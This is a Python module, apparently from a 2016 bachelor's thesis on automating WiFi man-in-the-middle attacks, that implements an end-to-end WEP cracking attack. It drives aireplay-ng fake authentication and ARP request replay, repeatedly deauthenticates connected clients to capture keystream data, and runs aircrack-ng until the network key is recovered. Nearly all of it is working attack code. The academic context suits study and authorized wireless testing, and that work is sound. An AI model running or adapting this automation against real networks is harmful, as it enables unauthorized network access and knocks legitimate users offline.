#!/usr/bin/env python3
"""
WEP cracking

Automation of MitM Attack on WiFi Networks
Bachelor's Thesis UIFS FIT VUT
Martin Vondracek
2016

#Implementation notes
- Airodump-ng writes its Text User Interface to stderr, stdout is empty.
- Airodump-ng has difficulties saving PRGA XOR based on some station vendors
  `"that's not really specific to WRT54G. It happens with some clients, like apple."
    <http://trac.aircrack-ng.org/ticket/372#comment:5>`_
  http://trac.aircrack-ng.org/ticket/915
  http://trac.aircrack-ng.org/ticket/372
- Aireplay-ng writes to stdout.
- Aircrack-ng does not flush when stdout is redirected to file and -q is set.
- Feedback from running subprocesses is obtained from their stdout and stderr. Method Popen.communicate() is
  unfortunately not suitable. 'Read data from stdout and stderr, until end-of-file is reached. Wait for process
  to terminate.'
  Reading of stdout and stderr is done continuously while the subprocess is running. This is achieved by that
  the subprocess is writing its stdout and stderr to temporary files. These files are then opened again and continuous
  writing and reading is performed. There's only one writer and one reader per file.
- Subprocesses' feedback result is available as an update of process' state, flags and stats. State describes current
  position in a lifecycle of the process. Flags can be set or cleared based on events during life of the process.
  Flags can be later cleared or set by other parts of the script - after the flag was recognised and appropriate
  reaction was performed.

"""
import logging
import os
import re
import subprocess
import time
from enum import Enum, unique
from typing import Dict

from .updatableProcess import UpdatableProcess

from .common import WirelessCapturer, deauthenticate
from .model import WirelessAccessPoint, WirelessInterface

__author__ = 'Martin Vondracek'
__email__ = 'xvondr20@stud.fit.vutbr.cz'

logger = logging.getLogger(__name__)


class FakeAuthentication(UpdatableProcess):
    """
    "The  fake authentication attack allows you to perform the two types of WEP authentication (Open System and
    Shared Key) plus associate with the access point (AP). This is only useful when you need  an associated  MAC
    address in various aireplay-ng attacks and there is currently no associated client.
    It should be noted that the fake authentication attack does NOT generate any ARP packets.
    Fake authentication cannot be used to authenticate/associate with WPA/WPA2 Access Points."
    `fake_authentication[Aircrack-ng] <http://www.aircrack-ng.org/doku.php?id=fake_authentication>`_

    Process at first tries Open System Authentication. If OSA is not supported and Shared Key Authentication is
    required, 'ska_required' flag is set. Fake Shared Key Authentication requires a keystream file to be provided.
    """

    @unique
    class State(Enum):
        """
        FakeAuthentication process states.
        """
        SENDING_KEEP_ALIVE = 0
        """Authenticated and associated successfully, sending keep-alive packet."""
        STARTED = 2
        """Process just started."""
        WAITING_FOR_A_BEACON_FRAME = 3
        """Waiting for a beacon frame."""
        TERMINATED = 100
        """Process have been terminated. By self.stop() call, on its own or by someone else."""

    def __init__(self, interface: WirelessInterface, ap: WirelessAccessPoint,
                 reassoc_delay=30, keep_alive_delay=5):
        """
        Uses previously saved PRGA XOR, if available.
        :type interface: WirelessInterface
        :param interface: wireless interface for fake authentication

        :type ap: WirelessAccessPoint
        :param ap: targeted AP

        :param reassoc_delay: reassociation timing in seconds
        :param keep_alive_delay: time between keep-alive packets
        """
        self.state = self.State.STARTED
        self.flags = self.__initial_flags()

        self.interface = interface  # type: WirelessInterface
        self.ap = ap  # type: WirelessAccessPoint

        cmd = ['aireplay-ng',
               '--fakeauth', str(reassoc_delay),
               '-q', str(keep_alive_delay),
               '-a', self.ap.bssid,
               '-h', self.interface.mac_address]
        if self.ap.prga_xor_path:
            cmd.append('-y')
            cmd.append(self.ap.prga_xor_path)
        cmd.append(self.interface.name)
        super().__init__(cmd)  # start process

    def __str__(self):
        return '<{!s} state={!s}, flags={!s}>'.format(
            type(self).__name__, self.state, self.flags)

    @staticmethod
    def __initial_flags() -> Dict[str, bool]:
        """
        Return initial flags describing state of the running process.
        :rtype: Dict[str, bool]
        """
        flags = dict()
        flags['deauthenticated'] = False
        """Flag 'deauthenticated' is set if at least one deauthentication packet was received."""
        flags['needs_prga_xor'] = False
        """Flag 'needs_prga_xor' is set if PRGA XOR file is needed for shared key authentication."""
        return flags

    def update(self):
        """
        Update state of running process from process' feedback.
        Read new output from stdout and stderr, check if process is alive. Set appropriate flags.
        """
        super().update()
        # Is process running? State would be changed after reading stdout and stderr.
        self.poll()

        # check every added line in stdout
        if self.stdout_r and not self.stdout_r.closed:
            for line in self.stdout_r:
                if 'Waiting for beacon frame' in line:
                    self.state = self.State.WAITING_FOR_A_BEACON_FRAME
                elif 'Association successful' in line:
                    self.state = self.State.SENDING_KEEP_ALIVE
                elif 'Got a deauthentication packet!' in line:
                    # set flag to notify that at least one deauthentication packet was received since last update
                    self.flags['deauthenticated'] = True
                    logger.warning('FakeAuthentication received a deauthentication packet!')
                elif 'Switching to shared key authentication' in line and not self.ap.prga_xor_path:
                    self.flags['needs_prga_xor'] = True
                    logger.info('FakeAuthentication needs PRGA XOR.')

        # check stderr
        if self.stderr_r and not self.stderr_r.closed:
            for line in self.stderr_r:  # type: str
                # NOTE: stderr should be empty
                logger.warning("Unexpected stderr of 'aireplay-ng --fakeauth': '{}'. {}".format(line, str(self)))

        # Change state if process was not running in the time of poll() call in the beginning of this method.
        # NOTE: Process' poll() needs to be called in the beginning of this method and returncode checked in the end
        # to ensure all feedback (stdout and stderr) is read and states are changed accordingly.
        # If the process exited, its state is not changed immediately. All available feedback is read and then
        # the state is changed to self.State.TERMINATED. State, flags,stats and others can be changed during reading
        # the available feedback even if the process exited. But self.State.TERMINATED is assigned here if
        # the process exited.
        if self.returncode is not None:
            self.state = self.State.TERMINATED


class ArpReplay(UpdatableProcess):
    """
    The classic ARP request replay attack is the most effective way to generate new initialization vectors  (IVs),
    and works very reliably. The program listens for an ARP packet then retransmits it back to the access point.
    This, in turn,  causes  the  access point  to  repeat  the  ARP  packet  with  a new IV. The program retransmits
    the same ARP packet over and over. However, each ARP packet  repeated  by  the  access point has a new IVs.
    It is all these new IVs which allow you to determine the WEP key.

    `arp-request_reinjection[Aircrack-ng]<http://www.aircrack-ng.org/doku.php?id=arp-request_reinjection>`_
    """
    # compiled regular expressions
    cre_ok = re.compile(
        r'^Read (?P<read>\d+) packets \(got (?P<ARPs>\d*[1-9]\d*) ARP requests and (?P<ACKs>\d*[1-9]\d*) ACKs\),'
        r' sent (?P<sent>\d*[1-9]\d*) packets...\((?P<pps>\d+) pps\)$'
    )
    cre_cap_filename = re.compile(
        r'^Saving ARP requests in (?P<cap_filename>replay_arp.+\.cap)$'
    )

    @unique
    class State(Enum):
        """
        ArpReplay process states.
        """
        REPLAYING = 0
        """Got ARP request, sending packets."""
        STARTED = 2
        """Process just started."""
        WAITING_FOR_A_BEACON_FRAME = 3
        """Waiting for a beacon frame."""
        WAITING_FOR_AN_ARP_REQUEST = 4
        """Waiting for an ARP request."""
        TERMINATED = 100
        """Process have been terminated. By self.stop() call, on its own or by someone else."""

    def __init__(self, interface: WirelessInterface, ap: WirelessAccessPoint, source_mac):
        """
        Start ARP Replay attack process.
        Uses previously saved ARP capture, if available.
        If ARP capture is not available, it is saved after detection of ARP Request.
        :type ap: WirelessAccessPoint
        :param ap: AP targeted for attack

        :type interface: WirelessInterface
        :param interface: wireless interface for connection

        :param source_mac: Source MAC address for replayed ARP packets
        """
        self.state = self.State.STARTED
        self.flags = self.__initial_flags()
        self.stats = self.__initial_stats()

        self.interface = interface  # type: WirelessInterface
        self.ap = ap  # type: WirelessAccessPoint

        self.cap_path = None

        cmd = ['aireplay-ng',
               '--arpreplay',
               '-b', self.ap.bssid,  # MAC address of access point.
               '-h', source_mac]
        # capture and extract packets from capture file?
        if self.ap.arp_cap_path:
            cmd.append('-r')
            cmd.append(self.ap.arp_cap_path)
        cmd.append(self.interface.name)
        super().__init__(cmd)

    def __str__(self):
        s = '<ArpReplay state=' + str(self.state) + \
            ', flags=' + str(self.flags) + \
            ', stats=' + str(self.stats) + \
            '>'
        return s

    @staticmethod
    def __initial_flags() -> Dict[str, bool]:
        """
        Return initial flags describing state of the running process.
        :rtype: Dict[str, bool]
        """
        flags = dict()
        flags['deauthenticated'] = False
        """Flag 'deauthenticated' is set if at least one deauthentication packet was received."""
        return flags

    @staticmethod
    def __initial_stats() -> Dict[str, int]:
        """
        Return initial stats object describing state of the running process.
        :rtype: Dict[str,int]
        """
        stats = {
            'read': 0,
            'ACKs': 0,
            'ARPs': 0,
            'sent': 0,
            'pps': 0
        }
        return stats

    def update(self):
        """
        Update state of running process from process' feedback.
        Read new output from stdout and stderr, check if process is alive. Set appropriate flags and stats.
        """
        super().update()
        # Is process running? State would be changed after reading stdout and stderr.
        self.poll()

        # check every added line in stdout
        if self.stdout_r and not self.stdout_r.closed:
            for line in self.stdout_r:
                if 'Waiting for beacon frame' in line:
                    self.state = self.State.WAITING_FOR_A_BEACON_FRAME
                elif 'got 0 ARP requests' in line:
                    self.state = self.State.WAITING_FOR_AN_ARP_REQUEST
                elif 'Notice: got a deauth/disassoc packet. Is the source MAC associated ?' in line:
                    # set flag to notify that at least one deauthentication packet was received since last update
                    self.flags['deauthenticated'] = True
                    logger.warning('ArpReplay received a deauthentication packet!')
                else:
                    m = self.cre_ok.match(line)
                    if m:
                        # correct output line detected
                        self.state = self.State.REPLAYING
                        # update stats
                        self.stats['read'] = m.group('read')
                        self.stats['ACKs'] = m.group('ACKs')
                        self.stats['ARPs'] = m.group('ARPs')
                        self.stats['sent'] = m.group('sent')
                        self.stats['pps'] = m.group('pps')
                        # save ARP Requests if the network does not have ARP capture file already
                        if not self.ap.arp_cap_path and self.cap_path:
                            self.ap.save_arp_cap(self.cap_path)

                    m = self.cre_cap_filename.match(line)
                    if m:
                        # capture filename announce detected
                        self.cap_path = os.path.join(self.tmp_dir.name, m.group('cap_filename'))

        # check stderr
        if self.stderr_r and not self.stderr_r.closed:
            for line in self.stderr_r:  # type: str
                # NOTE: stderr should be empty
                logger.warning("Unexpected stderr of 'aireplay-ng --arpreplay': '{}'. {}".format(line, str(self)))

        # Change state if process was not running in the time of poll() call in the beginning of this method.
        # NOTE: Process' poll() needs to be called in the beginning of this method and returncode checked in the end
        # to ensure all feedback (stdout and stderr) is read and states are changed accordingly.
        # If the process exited, its state is not changed immediately. All available feedback is read and then
        # the state is changed to self.State.TERMINATED. State, flags,stats and others can be changed during reading
        # the available feedback even if the process exited. But self.State.TERMINATED is assigned here if
        # the process exited.
        if self.returncode is not None:
            self.state = self.State.TERMINATED

    def cleanup(self, stop=True):
        """
        Cleanup after running process.
        Temp files are closed and deleted,
        :param stop: Stop process if it's running.
        """
        super().cleanup(stop=stop)
        self.cap_path = None  # file was deleted with tmp_dir


class WepCracker(UpdatableProcess):
    """
    Aircrack-ng can recover the WEP key once enough encrypted packets have been captured with airodump-ng. This part
    of the aircrack-ng suite determines the WEP key using two fundamental methods. The first method is via the PTW
    approach (Pyshkin, Tews, Weinmann). The default cracking method is PTW. This is done in two phases. In the first
    phase, aircrack-ng only uses ARP packets. If the key is not found, then it uses all the packets in the capture.
    Please remember that not all packets can be used for the PTW method. This Tutorial: Packets Supported for the PTW
    Attack page provides details. An important limitation is that the PTW attack currently can only crack 40 and 104 bit
    WEP keys. The main advantage of the PTW approach is that very few data packets are required to crack the WEP key.
    The second method is the FMS/KoreK method. The FMS/KoreK method incorporates various statistical attacks
    to discover the WEP key and uses these in combination with brute forcing.

    `aircrack-ng[Aircrack-ng] <http://www.aircrack-ng.org/doku.php?id=aircrack-ng>`_
    """

    @unique
    class State(Enum):
        """
        WepCracker process states.
        """
        CRACKING = 0
        """Cracking or waiting for more IVs."""
        STARTED = 2
        """Process just started."""
        TERMINATED = 100
        """Process have been terminated. By self.stop() call, on its own or by someone else."""

    def __init__(self, cap_filepath, ap):
        self.state = self.State.STARTED

        self.cap_filepath = cap_filepath
        self.ap = ap

        cmd = ['aircrack-ng',
               '-a', '1',
               '--bssid', self.ap.bssid,
               '-q',  # If set, no status information is displayed.
               '-l', 'psk.hex',  # Write the key into a file.
               self.cap_filepath]
        # NOTE: Aircrack-ng does not flush when stdout is redirected to file and -q is set.
        super().__init__(cmd)  # start process

    def __str__(self):
        return '<{!s} state={!s}>'.format(
            type(self).__name__, self.state)

    def update(self):
        """
        Update state of running process from process' feedback.
        Read new output from stdout and stderr, check if process is alive.
        Aircrack-ng does not flush when stdout is redirected to file and -q is set. Complete stdout is available
        in the moment of termination of aircrack-ng.
        """
        super().update()
        # Is process running? State would be changed after reading stdout and stderr.
        self.poll()

        # check every added line in stdout
        if self.stdout_r and not self.stdout_r.closed:
            for line in self.stdout_r:
                if 'Failed. Next try with' in line:
                    if self.state != self.State.TERMINATED:
                        self.state = self.State.CRACKING
                elif 'KEY FOUND!' in line:
                    if self.state != self.State.TERMINATED:
                        self.state = self.State.CRACKING
                    self.ap.save_psk_file(os.path.join(self.tmp_dir.name, 'psk.hex'))
                    logger.debug('WepCracker found key!')
                elif 'Decrypted correctly:' in line:
                    if '100%' not in line:
                        # Incorrect decryption?
                        logger.warning(line)

        # check stderr
        if self.stderr_r and not self.stderr_r.closed:
            for line in self.stderr_r:  # type: str
                # NOTE: stderr should be empty
                logger.warning("Unexpected stderr of 'aircrack-ng': '{}'. {}".format(line, str(self)))

        # Change state if process was not running in the time of poll() call in the beginning of this method.
        # NOTE: Process' poll() needs to be called in the beginning of this method and returncode checked in the end
        # to ensure all feedback (stdout and stderr) is read and states are changed accordingly.
        # If the process exited, its state is not changed immediately. All available feedback is read and then
        # the state is changed to self.State.TERMINATED. State, flags,stats and others can be changed during reading
        # the available feedback even if the process exited. But self.State.TERMINATED is assigned here if
        # the process exited.
        if self.returncode is not None:
            self.state = self.State.TERMINATED


class WepAttacker(object):
    """
    Main class providing attack on WEP secured network.
    """

    def __init__(self, ap: WirelessAccessPoint, monitoring_interface: WirelessInterface):
        """
        :type ap: WirelessAccessPoint
        :param ap: AP targeted for attack

        :type monitoring_interface: WirelessInterface
        :param monitoring_interface: network interface in monitor mode
        """
        self.ap = ap
        self.monitoring_interface = monitoring_interface

    def start(self, force=False):
        """
        Start attack on WEP secured network.
        If targeted network have already been cracked and `force` is False, attack is skipped.
        :param force: attack even if network have already been cracked

        Raises:
            CalledProcessError If FakeAuthentication unexpectedly terminates.
        """
        if not force and self.ap.is_cracked():
            #  AP already cracked
            logger.info('Known ' + str(self.ap))
            return
        with WirelessCapturer(interface=self.monitoring_interface,
                              ap=self.ap) as capturer:
            with FakeAuthentication(interface=self.monitoring_interface,
                                    ap=self.ap) as fake_authentication:
                time.sleep(1)

                # authenticate
                while fake_authentication.state != FakeAuthentication.State.SENDING_KEEP_ALIVE:
                    fake_authentication.update()
                    logger.debug(fake_authentication)

                    if fake_authentication.flags['needs_prga_xor']:
                        # stop fakeauth without prga_xor
                        fake_authentication.stop()
                        # deauthenticate stations to acquire prga_xor
                        result = capturer.get_capture_result()
                        if len(result):  # if AP was detected by capturer
                            tmp_ap = result[0]
                            while not capturer.has_prga_xor():
                                for st in tmp_ap.associated_stations:
                                    deauthenticate(self.monitoring_interface, st)
                                    time.sleep(2)
                                    if capturer.has_prga_xor():
                                        break
                            self.ap.save_prga_xor(capturer.capturing_xor_path)
                            logger.info('PRGA XOR detected.')
                            # start fakeauth with prga_xor
                            fake_authentication.cleanup()
                            fake_authentication = FakeAuthentication(interface=self.monitoring_interface, ap=self.ap)
                            time.sleep(1)
                        else:
                            logger.info('Network not detected by capturer yet.')

                    if fake_authentication.flags['deauthenticated']:
                        # wait and restart fakeauth
                        fake_authentication.cleanup()
                        logger.debug('fakeauth: 5 s backoff')
                        time.sleep(5)
                        fake_authentication = FakeAuthentication(interface=self.monitoring_interface, ap=self.ap)
                    time.sleep(2)

                    if fake_authentication.state == FakeAuthentication.State.TERMINATED and\
                            not (fake_authentication.flags['needs_prga_xor'] or
                                 fake_authentication.flags['deauthenticated']):
                        logger.error('FakeAuthentication unexpectedly terminated. {}'.format(str(fake_authentication)))
                        raise subprocess.CalledProcessError(returncode=fake_authentication.poll(),
                                                            cmd=fake_authentication.args)

                with ArpReplay(interface=self.monitoring_interface,
                               ap=self.ap,
                               source_mac=self.monitoring_interface.mac_address) as arp_replay:
                    # some time to create capture capturer.capturing_cap_path
                    while int(capturer.get_iv_sum()) < 100:
                        capturer.update()
                        fake_authentication.update()
                        arp_replay.update()

                        logger.debug(capturer)
                        logger.debug(fake_authentication)
                        logger.debug(arp_replay)

                        time.sleep(1)

                    with WepCracker(cap_filepath=capturer.capturing_cap_path,
                                    ap=self.ap) as cracker:
                        while not self.ap.is_cracked():
                            capturer.update()
                            fake_authentication.update()
                            arp_replay.update()
                            cracker.update()

                            logger.debug(capturer)
                            logger.debug(fake_authentication)
                            logger.debug(arp_replay)
                            logger.debug(cracker)
                            logger.info('#IV = ' + str(capturer.get_iv_sum()))

                            time.sleep(2)
                        logger.info('Cracked ' + str(self.ap))
